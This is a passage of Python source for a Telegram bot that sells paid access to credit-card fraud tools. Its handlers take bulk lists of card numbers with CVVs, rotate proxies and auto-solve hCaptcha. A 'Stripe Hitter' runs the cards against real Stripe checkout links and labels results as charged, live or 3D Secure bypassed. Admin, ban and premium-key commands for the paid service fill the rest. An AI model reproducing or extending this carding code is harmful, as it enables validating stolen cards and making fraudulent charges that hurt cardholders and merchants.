        return

    user_id = message.from_user.id

    if auth.is_banned(user_id):
        return

    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key.')}"
            f"\n{pe(E['next'])} /redeem {bold('Neon-xxxxx')}"
        )
        return

    # ── Must reply to a .txt file ─────────────────────────────────────────────
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')}\n\n"
            f"{pe(E['next'])} {bold('Send a .txt file with CCs')}\n"
            f"{pe(E['next'])} {bold('Reply to the file with')} /chk\n\n"
            f"{pe(E['bolt'])} {bold('Format:')} cc|mm|yy|cvv {bold('(one per line)')}"
        )
        return

    doc = message.reply_to_message.document
    if not doc.file_name or not doc.file_name.lower().endswith(".txt"):
        await message.reply(
            f"{pe(E['cross'])} {bold('Only .txt files are supported!')}"
        )
        return

    # ── Filename ban-check ────────────────────────────────────────────────────
    if await guard_gen_filename(message, user_id):
        return

    # ── Check proxy ───────────────────────────────────────────────────────────
    proxy_data = get_user_proxy(user_id)
    if not proxy_data:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Proxy Set!')}\n\n"
            f"{pe(E['warn'])} {bold('Add proxies first with')} /proxy"
        )
        return

    # ── Download file ─────────────────────────────────────────────────────────
    try:
        from io import BytesIO
        buf = BytesIO()
        await bot.download(doc.file_id, destination=buf)
        buf.seek(0)
        file_text = buf.read().decode("utf-8", errors="ignore")
    except Exception:
        await message.reply(
            f"{pe(E['cross'])} {bold('Failed to download file!')}"
        )
        return

    # ── Extract CCs ───────────────────────────────────────────────────────────
    # Run in executor: regex on a large file is CPU-bound and blocks the event loop
    from helpers import CC_PATTERN

    def _parse_ccs(text: str) -> list[str]:
        seen: set[str] = set()
        result: list[str] = []
        for m in CC_PATTERN.finditer(text):
            cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
            if cc not in seen:      # O(1) set lookup — was O(n) list scan = freeze on large files
                seen.add(cc)
                result.append(cc)
        if not result:
            for line in text.strip().splitlines():
                line = line.strip()
                parts = re.split(r'[|/]', line)
                if len(parts) >= 4:
                    cc = "|".join(p.strip() for p in parts[:4])
                    if cc not in seen:
                        seen.add(cc)
                        result.append(cc)
        return result

    all_ccs = await asyncio.get_running_loop().run_in_executor(
        CHECKER_POOL, _parse_ccs, file_text
    )

    if not all_ccs:
        await message.reply(
            f"{pe(E['cross'])} {bold('No valid CCs found in the file!')}"
        )
        return

    user_name = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""

    # ── Apply CC limit ────────────────────────────────────────────────────────
    cc_limit = auth.get_cc_limit(user_id)
    if len(all_ccs) > cc_limit:
        all_ccs = all_ccs[:cc_limit]
        await message.reply(
            f"{pe(E['warn'])} {bold('CC limit reached!')} {bold(str(cc_limit))} {bold('CCs max for your plan.')}\n"
            f"{pe(E['next'])} {bold('Extra CCs skipped.')}"
        )

    # ── Gen-checker detection (ban + abort if triggered) ─────────────────────
    if not await guard_gen_cards(all_ccs, message, user_id):
        return

    total = len(all_ccs)

    # ── Block duplicate runs ──────────────────────────────────────────────────
    if user_id in _RAN_ACTIVE_USERS:
        await message.reply(
            f"{pe(E['warn'])} {bold('MF! Your file check already in progress!')}\n\n"
            f"{pe(E['next'])} {bold('Wait for it to complete or tap')} {bold('Stop Checking')} {bold('first.')}"
        )
        return

    stop_key = f"{message.chat.id}:{user_id}"
    _RAN_STOP_FLAGS[stop_key] = False
    _RAN_ACTIVE_USERS.add(user_id)

    try:
        stop_btn = {
            "inline_keyboard": [[{
                "text": f"{bold('Stop Checking')}",
                "callback_data": f"ran_stop:{stop_key}",
                "icon_custom_emoji_id": E["stop"],
                "style": "danger",
            }]]
        }

        status_msg = await message.reply(
            f"{pe(E['rocket'])} {bold('Random File Check Started!')}\n\n"
            f"{pe(E['bolt'])} {bold('Total CCs:')} {bold(str(total))}\n"
            f"{pe(E['hourglass'])} {bold('Threads:')} {bold(str(RAN_PER_USER))} {bold('per user')} │ {bold(str(_RAN_GLOBAL_LIMIT))} {bold('global')}\n"
            f"{pe(E['refresh'])} {bold('Random proxy + site per CC')}\n"
            f"{pe(E['star'])} {bold('Auto-retry on dead sites')}\n\n"
            f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}",
            reply_markup=stop_btn,
        )

        await _process_ran_cards(all_ccs, user_id, user_name, user_uname, message.chat.id, status_msg, stop_key)
    finally:
        _RAN_ACTIVE_USERS.discard(user_id)


# ══════════════════════════════════════════════════════════════════════════════
#  /admin COMMAND — Owner adds/removes admins
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("admin"))
async def cmd_admin(message: types.Message):
    if not auth.is_owner(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('Owner only command!')}")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip().isdigit():
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /admin {bold('user-id')}"
        )
        return

    target_id = int(args[1].strip())
    if auth.add_admin(target_id):
        await message.reply(
            f"{pe(E['check'])} {bold('Admin Added!')}\n\n"
            f"{pe(E['user'])} {bold('ID:')} {bold(str(target_id))}"
        )
        try:
            await bot.send_message(
                target_id,
                f"{pe(E['gem'])} {bold('You have been promoted to Admin!')}\n\n"
                f"{pe(E['bolt'])} {bold('You now have full admin access.')}"
            )
        except Exception:
            pass
    else:
        await message.reply(f"{pe(E['warn'])} {bold('User is already an admin.')}")


# ══════════════════════════════════════════════════════════════════════════════
#  /unadmin COMMAND — Owner removes admin
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("unadmin"))
async def cmd_unadmin(message: types.Message):
    if not auth.is_owner(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('Owner only command!')}")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip().isdigit():
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /unadmin {bold('user-id')}"
        )
        return

    target_id = int(args[1].strip())
    if auth.remove_admin(target_id):
        await message.reply(
            f"{pe(E['check'])} {bold('Admin Removed!')}\n\n"
            f"{pe(E['user'])} {bold('ID:')} {bold(str(target_id))}"
        )
    else:
        await message.reply(f"{pe(E['warn'])} {bold('User is not an admin.')}")


# ══════════════════════════════════════════════════════════════════════════════
#  /auth COMMAND — Admin gives premium access
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("auth"))
async def cmd_auth(message: types.Message):
    if not auth.is_admin(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('Admin only command!')}")
        return

    args = message.text.split()
    if len(args) < 2 or not args[1].strip().isdigit():
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /auth {bold('user-id')} {bold('[days]')}\n"
            f"{pe(E['next'])} {bold('Days is optional (0 = lifetime)')}"
        )
        return

    target_id = int(args[1].strip())
    days = int(args[2]) if len(args) >= 3 and args[2].isdigit() else 0

    auth.auth_user(target_id, days=days, by=message.from_user.id)
    expiry_text = "Lifetime" if days == 0 else f"{days} days"

    await message.reply(
        f"{pe(E['check'])} {bold('Premium Granted!')}\n\n"
        f"{pe(E['user'])} {bold('ID:')} {bold(str(target_id))}\n"
        f"{pe(E['gem'])} {bold('Plan:')} {bold(expiry_text)}"
    )

    # Notify user
    try:
        await bot.send_message(
            target_id,
            f"{pe(E['gem'])} {bold('Premium Access Activated!')} {pe(E['gem'])}\n\n"
            f"{pe(E['check'])} {bold('Thanks for your purchase!')}\n"
            f"{pe(E['bolt'])} {bold('Plan:')} {bold(expiry_text)}\n\n"
            f"{pe(E['rocket'])} {bold('You now have access to:')}\n"
            f"{pe(E['next'])} /sh — {bold('Check CC')}\n"
            f"{pe(E['next'])} /hitco — {bold('Stripe Hitter')}\n"
            f"{pe(E['next'])} /chk — {bold('File Check')}\n\n"
            f"{pe(E['sparkle'])} {bold('Enjoy your premium experience!')}"
        )
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  /unauth COMMAND — Admin removes premium
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("unauth"))
async def cmd_unauth(message: types.Message):
    if not auth.is_admin(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('Admin only command!')}")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip().isdigit():
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /unauth {bold('user-id')}"
        )
        return

    target_id = int(args[1].strip())
    if auth.unauth_user(target_id):
        await message.reply(
            f"{pe(E['check'])} {bold('Premium Removed!')}\n\n"
            f"{pe(E['user'])} {bold('ID:')} {bold(str(target_id))}"
        )
    else:
        await message.reply(f"{pe(E['warn'])} {bold('User has no premium access.')}")


# ══════════════════════════════════════════════════════════════════════════════
#  /ban COMMAND — Admin bans user
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("ban"))
async def cmd_ban(message: types.Message):
    if not auth.is_admin(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('Admin only command!')}")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip().isdigit():
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /ban {bold('user-id')}"
        )
        return

    target_id = int(args[1].strip())
    if auth.ban_user(target_id):
        await message.reply(
            f"{pe(E['check'])} {bold('User Banned!')}\n\n"
            f"{pe(E['user'])} {bold('ID:')} {bold(str(target_id))}"
        )
    else:
        await message.reply(f"{pe(E['warn'])} {bold('User is already banned.')}")


# ══════════════════════════════════════════════════════════════════════════════
#  /unban COMMAND — Admin unbans user
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("unban"))
async def cmd_unban(message: types.Message):
    if not auth.is_admin(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('Admin only command!')}")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip().isdigit():
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /unban {bold('user-id')}"
        )
        return

    target_id = int(args[1].strip())
    if target_id not in _banned_users:
        await message.reply(f"{pe(E['warn'])} {bold('User is not banned.')}")
        return

    unban_user(target_id)
    await message.reply(
        f"{pe(E['check'])} {bold('User Unbanned!')}\n\n"
        f"{pe(E['user'])} {bold('ID:')} {bold(str(target_id))}"
    )


# ══════════════════════════════════════════════════════════════════════════════
#  /key COMMAND — Admin generates premium keys
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("key"))
async def cmd_key(message: types.Message):
    if not auth.is_admin(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('Admin only command!')}")
        return

    args = message.text.split()
    if len(args) < 3 or not args[1].isdigit() or not args[2].isdigit():
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /key {bold('users')} {bold('days')}\n\n"
            f"{pe(E['next'])} {bold('Example:')} /key 10 1\n"
            f"{pe(E['next'])} {bold('Generates 1 key — 10 users can redeem, 1 day each')}"
        )
        return

    max_users = int(args[1])
    days = int(args[2])

    if max_users < 1 or max_users > 1000:
        await message.reply(f"{pe(E['cross'])} {bold('Users must be 1-1000')}")
        return

    keys = auth.generate_keys(max_users, days, created_by=message.from_user.id)
    key = keys[0]

    text = (
        f"{pe(E['gem'])} {bold('𝙆𝙚𝙮 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙚𝙙')} {pe(E['check'])}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"┣ {pe(E['bolt'])} {bold('𝗞𝗲𝘆')} ➜ <code>{key}</code>\n"
        f"┣ {pe(E['user'])} {bold('𝗦𝗹𝗼𝘁𝘀')} ➜ {bold(str(max_users))} {bold('users can redeem')}\n"
        f"┣ {pe(E['star'])} {bold('𝗣𝗹𝗮𝗻')} ➜ {bold(str(days))} {bold('days each')}\n\n"
        f"{pe(E['sparkle'])} {bold('𝗨𝘀𝗲𝗿𝘀 𝗿𝗲𝗱𝗲𝗲𝗺 𝘄𝗶𝘁𝗵')} /redeem {key} {pe(E['bolt'])}"
    )
    await message.reply(text)


# ══════════════════════════════════════════════════════════════════════════════
#  /redeem COMMAND — User redeems a premium key
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("redeem"))
async def cmd_redeem(message: types.Message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip():
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /redeem {bold('Neon-xxxxx')}"
        )
        return

    if auth.is_premium(message.from_user.id):
        expiry = auth.get_premium_expiry(message.from_user.id)
        await message.reply(
            f"{pe(E['cross'])} {bold('You already have premium!')}\n\n"
            f"{pe(E['bolt'])} {bold('Plan:')} {bold(expiry)}\n"
            f"{pe(E['warn'])} {bold('You cannot redeem another key while premium is active.')}"
        )
        return

    key = args[1].strip()
    success, info = auth.redeem_key(message.from_user.id, key)

    if success:
        await message.reply(
            f"{pe(E['gem'])} {bold('Key Redeemed Successfully!')} {pe(E['gem'])}\n\n"
            f"{pe(E['check'])} {bold('Thanks for your purchase!')}\n"
            f"{pe(E['bolt'])} {bold('Plan:')} {bold(info)}\n\n"
            f"{pe(E['rocket'])} {bold('You now have access to:')}\n"
            f"{pe(E['next'])} /sh — {bold('Check CC')}\n"
            f"{pe(E['next'])} /hitco — {bold('Stripe Hitter')}\n"
            f"{pe(E['next'])} /chk — {bold('File Check')}\n\n"
            f"{pe(E['sparkle'])} {bold('Enjoy your premium experience!')}"
        )
    else:
        await message.reply(
            f"{pe(E['cross'])} {bold('Redemption Failed!')}\n\n"
            f"{pe(E['warn'])} {bold(info)}"
        )


# ══════════════════════════════════════════════════════════════════════════════
#  /nopecha COMMAND — Set / view / clear NopeCHA API key (per-user, optional)
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("nopecha"))
async def cmd_nopecha(message: types.Message):
    """
    /nopecha              — show current key status
    /nopecha <key>        — validate & save key
    /nopecha set <key>    — validate & save key (alias)
    /nopecha clear        — remove saved key
    """
    user_id = message.from_user.id

    if auth.is_banned(user_id):
        return

    args_text = (message.text or "").split(maxsplit=1)
    arg = args_text[1].strip() if len(args_text) >= 2 else ""

    # ── CLEAR ──
    if arg.lower() == "clear":
        auth.set_nopecha_key(user_id, "")
        await message.reply(
            f"{pe(E['check'])} {bold('NopeCHA key cleared.')}\n\n"
            f"{pe(E['warn'])} {bold('Captcha auto-solve is now disabled.')}\n"
            f"{pe(E['next'])} {bold('Use')} /nopecha {bold('<api_key>')} {bold('to add one.')}"
        )
        return

    # ── SHOW STATUS ──
    if not arg or arg.lower() == "status":
        existing = auth.get_nopecha_key(user_id)
        if not existing:
            await message.reply(
                f"{pe(E['warn2'])} {bold('No NopeCHA API key set.')}\n\n"
                f"{pe(E['next'])} {bold('To enable auto captcha solving:')}\n"
                f"{pe(E['bolt'])} /nopecha {bold('<your_api_key>')}\n\n"
                f"{pe(E['link'])} {bold('Get your key at:')} nopecha.com"
            )
        else:
            masked = existing[:6] + "..." + existing[-4:] if len(existing) > 10 else "****"
            await message.reply(
                f"{pe(E['check'])} {bold('NopeCHA key is set.')}\n\n"
                f"{pe(E['bolt'])} {bold('Key:')} {bold(masked)}\n"
                f"{pe(E['sparkle'])} {bold('hCaptcha will be auto-solved when triggered.')}\n\n"
                f"{pe(E['next'])} {bold('To remove:')} /nopecha clear"
            )
        return

    # ── SET KEY (strip optional "set " prefix) ──
    key = arg[4:].strip() if arg.lower().startswith("set ") else arg

    if not key:
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /nopecha {bold('<api_key>')}"
        )
        return

    # Validate key against NopeCHA status endpoint
    validating_msg = await message.reply(
        f"{pe(E['loading'])} {bold('Validating NopeCHA key...')}"
    )
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            resp = await client.get(
                "https://api.nopecha.com/v1/status",
                headers={"Authorization": f"Basic {key}"},
            )
        if resp.status_code == 401:
            await safe_edit(validating_msg, 
                f"{pe(E['cross'])} {bold('Invalid API key.')}\n\n"
                f"{pe(E['warn'])} {bold('NopeCHA rejected this key. Please check and try again.')}"
            )
            return
        if resp.status_code == 403:
            await safe_edit(validating_msg, 
                f"{pe(E['cross'])} {bold('Access denied.')}\n\n"
                f"{pe(E['warn'])} {bold('NopeCHA returned 403. IP may be banned or key suspended.')}"
            )
            return
        resp.raise_for_status()
        data    = resp.json()
        status  = (data.get("status") or "").strip()
        plan    = data.get("plan") or "Unknown"
        credit  = data.get("credit") or data.get("credits") or 0
    except httpx.HTTPStatusError as e:
        await safe_edit(validating_msg, 
            f"{pe(E['cross'])} {bold('Validation failed.')}\n\n"
            f"{pe(E['warn'])} {bold(f'HTTP {e.response.status_code}')}"
        )
        return
    except Exception as e:
        await safe_edit(validating_msg, 
            f"{pe(E['cross'])} {bold('Could not reach NopeCHA.')}\n\n"
            f"{pe(E['warn'])} {bold(str(e)[:80])}"
        )
        return

    if status.lower() not in ("active", "ok", "valid", ""):
        await safe_edit(validating_msg, 
            f"{pe(E['cross2'])} {bold('Key not active.')}\n\n"
            f"{pe(E['warn'])} {bold('Status:')} {bold(status)}\n"
            f"{pe(E['next'])} {bold('Please renew your NopeCHA plan.')}"
        )
        return

    # Key is valid — save it
    auth.set_nopecha_key(user_id, key)
    masked = key[:6] + "..." + key[-4:] if len(key) > 10 else "****"
    await safe_edit(validating_msg, 
        f"{pe(E['gem'])} {bold('NopeCHA Key Saved!')} {pe(E['gem'])}\n\n"
        f"{pe(E['check'])} {bold('Key:')} {bold(masked)}\n"
        f"{pe(E['bolt'])} {bold('Plan:')} {bold(str(plan))}\n"
        f"{pe(E['bank'])} {bold('Credits:')} {bold(str(credit))}\n\n"
        f"{pe(E['sparkle'])} {bold('hCaptcha will now be auto-solved during /hitco checks.')}\n"
        f"{pe(E['next'])} {bold('To remove:')} /nopecha clear"
    )


# ══════════════════════════════════════════════════════════════════════════════
#  /hit COMMAND — Stripe checkout autohitter (max 10 CCs)
# ══════════════════════════════════════════════════════════════════════════════

HIT_MAX_CCS = 10
_HIT_EDIT_LOCKS: dict[int, asyncio.Lock] = {}
_HIT_STOP_FLAGS: dict[str, bool] = {}
_HIT_ACTIVE_USERS: set[int] = set()



def _hit_is_payment_success(result: dict) -> bool:
    """True when hit.php reports a successful charge (status or response text)."""
    if not result.get("ok"):
        return False
    status = (result.get("result_status") or "").lower()
    if status in ("charge", "charged"):
        return True
    msg = (result.get("result_msg") or "").lower()
    return any(x in msg for x in ("payment successful", "succeeded", " paid"))


def _hit_status_line(result: dict) -> str:
    """Map Stripe hit result to a styled status line."""
    if not result.get("ok"):
        err = result.get("error") or ""
        if result.get("session_dead"):
            return f"{_sp()} {bold('SESSION EXPIRED')}"
        return f"{_sp()} {bold(err[:60])}"

    if result.get("hcaptcha"):
        return f"{_sp()} {bold('CAPTCHA WALL')}"

    status = result.get("result_status", "")
    msg = result.get("result_msg", "")

    if _hit_is_payment_success(result):
        return f"{_sp()} {bold('CHARGED · ORDER PLACED')}"
    if status in ("live", "approved"):
        msg_lower = msg.lower()
        if "insufficient" in msg_lower:
            return f"{_sp()} {bold('CCN LIVE · LOW BALANCE')}"
        if "cvc" in msg_lower:
            return f"{_sp()} {bold('CCN LIVE · CVC MISMATCH')}"
        return f"{_sp()} {bold('LIVE · ' + msg)}"
    return f"{_sp()} {bold('DECLINED')}"


def _hit_raw_response(result: dict) -> str:
    if not result.get("ok"):
        return result.get("error") or "Failed"
    return result.get("result_msg") or "Unknown"


def _hit_cc_block(cc: str, result: dict) -> str:
    sl = _hit_status_line(result)
    raw = _hit_raw_response(result)
    tds_line = f"\n{_sp()} {bold('3D Secure:')} {bold('Bypassed')}" if result.get("tds_bypassed") else ""
    return (
        f"{sl}\n"
        f"{_sp()} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
        f"{_sp()} {bold('Response:')} {bold(raw)}"
        f"{tds_line}"
    )


def _hit_is_session_dead(result: dict) -> bool:
    return bool(result.get("session_dead"))


def _hit_is_success(result: dict) -> bool:
    return _hit_is_payment_success(result)


def _hit_is_live(result: dict) -> bool:
    return (
        result.get("ok", False)
        and result.get("result_status") in ("live", "approved")
        and not _hit_is_payment_success(result)
    )


async def _hit_check_single(
    cc_str: str, checkout_url: str, user_id: int,
    status_msg: types.Message, results: dict, order: list,
    user_name: str, user_uname: str, stop_key: str,
    checkout_info: dict,
    nopecha_key: str = "",
):
    if _HIT_STOP_FLAGS.get(stop_key):
        results[cc_str] = {"ok": False, "error": "Stopped"}
        return

    proxies = get_effective_proxies(user_id)
    proxy_data = random.choice(proxies) if proxies else None

    sem = get_user_semaphore(user_id)
    async with sem:
        try:
            result = await asyncio.get_running_loop().run_in_executor(
                CHECKER_POOL, hit.run_hit_check, checkout_url, cc_str, proxy_data, 3, nopecha_key,
            )
        except Exception as e:
            result = {"ok": False, "error": str(e)[:80]}

    msg_id = status_msg.message_id
    if msg_id not in _HIT_EDIT_LOCKS:
        _HIT_EDIT_LOCKS[msg_id] = asyncio.Lock()

    results[cc_str] = result

    if _hit_is_session_dead(result):
        _HIT_STOP_FLAGS[stop_key] = True

    # ── Update shared message ──
    async def _do_edit():
        async with _HIT_EDIT_LOCKS[msg_id]:
            done_count = sum(1 for cc in order if cc in results)
            total = len(order)
            header = (
                f"{_sp()} {bold('STRIPE CONSOLE')} {_sp()} {bold(str(done_count))}{bold('/')}{bold(str(total))}\n\n"
                f"{_sp()} {bold('Merchant:')} {bold(checkout_info.get('merchant', '-'))}\n"
                f"{_sp()} {bold('Product:')} {bold(checkout_info.get('product', '-'))}\n"
                f"{_sp()} {bold('Amount:')} {bold(checkout_info.get('amount_str', '-'))}\n"
                f"{_sp()} {bold('Link:')} {bold(checkout_info.get('link_short', '-'))}\n"
                f"{_sp()} {bold('Return URL:')} {bold(checkout_info.get('success_url', '-'))}\n"
            )
            lines = [header]
            for cc in order:
                if cc in results:
                    lines.append(_hit_cc_block(cc, results[cc]))
                else:
                    lines.append(
                        f"{_sp()} <tg-spoiler>{cc}</tg-spoiler> {bold('queued...')}"
                    )
            if _HIT_STOP_FLAGS.get(stop_key) and _hit_is_session_dead(results.get(cc_str, {})):
                lines.append(f"\n{_sp()} {bold('SESSION EXPIRED · RUN HALTED')}")
            lines.append(f"\n{_sp()} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}")
            try:
                await safe_edit(status_msg, "\n\n".join(lines))
            except Exception:
                pass

    await _do_edit()

    if sum(1 for cc in order if cc in results) == len(order):
        _HIT_EDIT_LOCKS.pop(msg_id, None)


@router.message(Command("hitco", "hit"))
async def cmd_hit(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id

    if auth.is_banned(user_id):
        return

    # Premium access required (same as /sh, /msh, /ran)
    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{_sp()} {bold('PREMIUM ACCESS REQUIRED')}"
            f"\n\n{_sp()} {bold('Contact admin or redeem a key')}"
            f"\n{_sp()} /redeem {bold('Neon-xxxxx')}"
        )
        return

    if user_id in _HIT_ACTIVE_USERS:
        await message.reply(
            f"{_sp()} {bold('A STRIPE RUN IS ALREADY ACTIVE')}\n\n"
            f"{_sp()} {bold('Wait for it to finish or tap')} {bold('Abort Run')} {bold('first.')}"
        )
        return

    # ── Extract link + CCs ──
    raw_text = ""
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        raw_text = args[1]

    if message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw_text = raw_text + "\n" + reply_text if raw_text else reply_text

    if not raw_text.strip():
        await message.reply(
            f"{_sp()} {bold('STRIPE CONSOLE · USAGE')}\n\n"
            f"{_sp()} /hitco <Stripe URL>\n"
            f"cc|mm|yy|cvv\n\n"
            f"{_sp()} {bold('Supported links:')}\n"
            f"• checkout.stripe.com/c/pay/...\n"
            f"• billing.stripe.com/p/session/...\n"
            f"• invoice.stripe.com/i/...\n"
            f"• Custom domain with cs_live_...\n\n"
            f"{_sp()} {bold('Max')} {bold(str(HIT_MAX_CCS))} {bold('CCs per run.')}"
        )
        return

    # ── Find Stripe link (checkout / billing portal / invoice / payment link / custom domain) ──
    link_match = re.search(
        r'https?://[^\s]*(?:'
        r'checkout\.stripe\.com'
        r'|billing\.stripe\.com'
        r'|invoice\.stripe\.com'
        r'|payment\.stripe\.com'
        r'|pay\.stripe\.com'
        r'|cs_(?:live|test)_'
        r'|plink_(?:live|test)_'
        r')[^\s]*',
        raw_text, re.IGNORECASE,
    )
    if not link_match:
        await message.reply(
            f"{_sp()} {bold('NO STRIPE LINK DETECTED')}\n\n"
            f"{_sp()} {bold('Supported URLs:')}\n"
            f"• checkout.stripe.com/c/pay/...\n"
            f"• billing.stripe.com/p/session/...\n"
            f"• invoice.stripe.com/i/...\n"
            f"• Custom domain with cs_live_... or plink_live_..."
        )
        return
    checkout_url = link_match.group(0)

    # ── Find CCs ──
    from helpers import CC_PATTERN
    all_ccs = _DedupeList()
    for m in CC_PATTERN.finditer(raw_text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)

    if not all_ccs:
        for line in raw_text.strip().splitlines():
            line = line.strip()
            parts = re.split(r'[|/]', line)
            if len(parts) >= 4:
                num = parts[0].strip()
                if num.isdigit() and len(num) >= 13:
                    cc = "|".join(p.strip() for p in parts[:4])
                    if cc not in all_ccs:
                        all_ccs.append(cc)

    if not all_ccs:
        await message.reply(
            f"{_sp()} {bold('NO VALID CCS DETECTED')}\n\n"
            f"{_sp()} {bold('Format:')} cc|mm|yy|cvv"
        )
        return

    skipped = 0
    if len(all_ccs) > HIT_MAX_CCS:
        skipped = len(all_ccs) - HIT_MAX_CCS
        all_ccs = all_ccs[:HIT_MAX_CCS]

    # ── Check proxy ──
    proxies = get_effective_proxies(user_id)
    if not proxies:
        await message.reply(
            f"{_sp()} {bold('PROXY REQUIRED')}\n\n"
            f"{_sp()} {bold('Add a proxy before running this gate.')}\n"
            f"{_sp()} {bold('Use:')} /proxy host:port:user:pass"
        )
        return

    user_name = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""
    total = len(all_ccs)
    chat_id = message.chat.id
    stop_key = f"hit:{chat_id}:{user_id}"
    _HIT_STOP_FLAGS[stop_key] = False
    _HIT_ACTIVE_USERS.add(user_id)

    # ── Get NopeCHA key for auto captcha solving ──
    nopecha_key = auth.get_nopecha_key(user_id)

    # Build a readable short label from any Stripe link type
    _id_m = re.search(r'(cs_(?:live|test)_[a-zA-Z0-9]+|plink_(?:live|test)_[a-zA-Z0-9]+)', checkout_url)
    if _id_m:
        link_short = _id_m.group(1)[:28] + "..."
    elif "billing.stripe.com" in checkout_url:
        link_short = "billing.stripe.com/..."
    elif "invoice.stripe.com" in checkout_url:
        link_short = "invoice.stripe.com/..."
    elif "payment.stripe.com" in checkout_url or "pay.stripe.com" in checkout_url:
        link_short = "pay.stripe.com/..."
    else:
        link_short = checkout_url.split("/")[-1][:28] + "..."

    # ── Grab session info with first CC ──
    loading_msg = await message.reply(
        f"{_sp()} {bold('BOOTING STRIPE SESSION...')}\n\n"
        f"{_sp()} {bold(checkout_url[:60] + '...')}"
    )

    try:
        proxy_data = random.choice(proxies)
        first_result = await asyncio.get_running_loop().run_in_executor(
            CHECKER_POOL, hit.run_hit_check, checkout_url, all_ccs[0], proxy_data, 3, nopecha_key,
        )
    except Exception as e:
        _HIT_ACTIVE_USERS.discard(user_id)
        _HIT_STOP_FLAGS.pop(stop_key, None)
        await safe_edit(loading_msg,
            f"{_sp()} {bold('SESSION BOOT FAILED')}\n\n"
            f"{_sp()} {bold(str(e)[:100])}"
        )
        return

    if not first_result.get("ok") and _hit_is_session_dead(first_result):
        _HIT_ACTIVE_USERS.discard(user_id)
        _HIT_STOP_FLAGS.pop(stop_key, None)
        await safe_edit(loading_msg,
            f"{_sp()} {bold('SESSION EXPIRED')}\n\n"
            f"{_sp()} {bold(first_result.get('error', 'Checkout expired or completed.'))}"
        )
        return

    merchant = first_result.get("merchant") or "-"
    product = first_result.get("product") or "-"
    amount_str = first_result.get("price_display") or "-"
    success_url = first_result.get("success_url") or "-"
    if success_url != "-" and len(success_url) > 50:
        from urllib.parse import urlparse as _urlparse
        _p = _urlparse(success_url)
        success_url = f"{_p.scheme}://{_p.netloc}{_p.path[:30]}..."

    checkout_info = {
        "merchant": merchant,
        "product": product,
        "amount_str": amount_str,
        "link_short": link_short,
        "success_url": success_url,
    }

    results: dict = {all_ccs[0]: first_result}
    order = list(all_ccs)

    # ── Build initial status message ──
    header = (
        f"{_sp()} {bold('STRIPE CONSOLE')} {_sp()} {bold('1')}{bold('/')}{bold(str(total))}\n\n"
        f"{_sp()} {bold('Merchant:')} {bold(merchant)}\n"
        f"{_sp()} {bold('Product:')} {bold(product)}\n"
        f"{_sp()} {bold('Amount:')} {bold(amount_str)}\n"
        f"{_sp()} {bold('Link:')} {bold(link_short)}\n"
        f"{_sp()} {bold('Return URL:')} {bold(success_url)}\n"
    )

    init_lines = [header]
    init_lines.append(_hit_cc_block(all_ccs[0], first_result))
    for cc in all_ccs[1:]:
        init_lines.append(f"{_sp()} <tg-spoiler>{cc}</tg-spoiler> {bold('queued...')}")

    if skipped > 0:
        init_lines.append(f"\n{_sp()} {bold(str(skipped))} {bold('CCs skipped (max')} {bold(str(HIT_MAX_CCS))}{bold(')')}")

    init_lines.append(f"\n{_sp()} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}")

    init_kb = {
        "inline_keyboard": [[{
            "text": f"{bold('⌫ Abort Run')}",
